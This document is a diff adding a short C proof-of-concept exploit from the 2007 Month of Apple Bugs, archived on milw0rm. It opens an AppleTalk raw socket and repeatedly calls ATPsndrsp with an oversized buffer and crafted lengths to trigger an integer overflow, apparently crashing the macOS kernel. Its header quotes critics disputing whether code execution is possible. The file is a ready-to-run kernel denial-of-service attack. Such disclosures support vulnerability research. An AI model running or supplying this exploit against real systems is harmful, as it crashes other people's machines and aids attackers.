@@ -1,0 +1,60 @@
+/* proof of concept for moab-14-01-2007
+ * Copyright (c) 2006, LMH <lmh [at] infopull.com>
+ * Shout outs to: icer, kf, ilja, hd, et al.
+ *
+ * free feedback samples for public consumption:
+ *
+ * "the panic() function takes a string for the reason the panic
+ * occurred. As you can see from the above, the reason us due to the
+ * fact the buffer size is absurd. The system caught this absurdity and
+ * handled it by calling panic().
+ * In other words, not capable of executing arbitrary code."
+ * -- Rosyna Keller, talking about allocbuf() failing due to allocation
+ * of a negative size buffer, caused by a simple integer overflow.
+ *
+ *
+ * ">LMH claims #10 leads to "potential arbitrary code execution." That's
+ * >not good enough where I come from. Either the arbitrary code executes,
+ * >or it doesn't. I may be talking thru my elbow, but I suggest the
+ * >absence of a working example of "arbitrary code execution" is that we
+ * >have caused a kernel panic, and stack based execution ceases."
+ * -- dinornis, stack based haxor in training.
+ *
+ */
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdarg.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <sys/sockio.h>
+#include <netat/appletalk.h>
+
+int main(int argc, char **argv) {
+        int fd, retv, i;
+		unsigned int a, b;
+		char *powder;
+
+        if ((fd = socket(AF_APPLETALK, SOCK_RAW, 0)) < 0)
+                exit(1);
+		
+		powder = malloc(6000);
+		memset(powder, 0x41, 5999);
+
+		for (i=0; i < 7000; i++) {
+			a = strlen(powder) - i;
+			b = i;
+			printf("powder@%p a=%u b=%u\n", powder, a, b);
+			retv = ATPsndrsp(fd, (unsigned char *)powder, a, b);
+		}
+		
+        close(fd);
+		free(powder); // won't reach this unless appletalk is disabled
+		return 0;
+}
+
+// milw0rm.com [2007-01-14]
